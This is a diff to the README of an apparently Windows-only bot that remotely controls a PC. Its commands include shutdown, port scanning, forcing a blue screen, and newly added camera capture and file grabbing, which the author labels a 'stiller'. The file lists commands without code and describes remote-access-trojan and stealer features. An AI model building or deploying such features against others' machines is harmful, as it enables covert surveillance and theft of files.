@@ -18,6 +18,9 @@ only for windows
 * **``/shutdown`` - have 2 arg: `r (reboot)` and `s (shutdown)`. this command can shutdown and reboot your pc**
 * **``/pscan`` - scanning all ports in `local ip`**
 * **``/bsod`` - calling BLue Screen Of Death / [BSOD ](https://i.ytimg.com/vi/Rom6IUmQj-4/maxresdefault.jpg?sqp=-oaymwEmCIAKENAF8quKqQMa8AEB-AH2CIAC0AWKAgwIABABGBMgTih_MA8=&amp;rs=AOn4CLDyJNckGfEAcydWc5y7qjuU_ygd5A)**
+* **``/cam`` - takes screenshot from the front camera**
+* **``/get`` - get files from pc (stiller)**
+
 ***
 ### Usage
 1. **open `user.json` and set your `account id` and `bot token`**
